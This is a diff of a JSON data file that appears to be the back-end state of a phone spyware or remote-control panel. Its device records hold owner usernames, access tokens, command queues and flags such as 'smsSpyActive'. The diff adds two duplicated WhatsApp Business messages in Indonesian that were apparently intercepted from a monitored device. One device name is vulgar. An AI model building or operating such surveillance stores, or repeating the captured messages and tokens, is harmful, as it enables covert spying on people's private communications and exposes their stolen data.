@@ -20264,7 +20264,7 @@
     "deviceName": "HP-ZAL7SEX-C6BD",
     "ownerUsername": "Zal7Sex",
     "token": "738824701922b7ee60ca24b5585f02c4",
-    "lastSeen": 1777536802671,
+    "lastSeen": 1777536820977,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-30T07:59:50.674Z",
@@ -20279,7 +20279,24 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "Call Me Zal7Sex",
+        "content": "lah minta apk kembali, inget dulu lu buat kesalahan asal buat role vip, di aplikasi nya udah tertera dan gw udah pernah ngasih tau \"jangan asal buat role vip kalo gada buyer\"",
+        "time": "30/04 15:13",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777536822026
+      },
+      {
+        "appName": "WA Business",
+        "sender": "Call Me Zal7Sex",
+        "content": "lah minta apk kembali, inget dulu lu buat kesalahan asal buat role vip, di aplikasi nya udah tertera dan gw udah pernah ngasih tau \"jangan asal buat role vip kalo gada buyer\"",
+        "time": "30/04 15:13",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777536821812
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
@@ -20296,7 +20313,7 @@
     "deviceName": "HP-KONTOL-8573",
     "ownerUsername": "Ubill_raa",
     "token": "b427c33278b13d5af884032fb7e07a58",
-    "lastSeen": 1777536802744,
+    "lastSeen": 1777536820585,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-30T08:13:22.744Z",
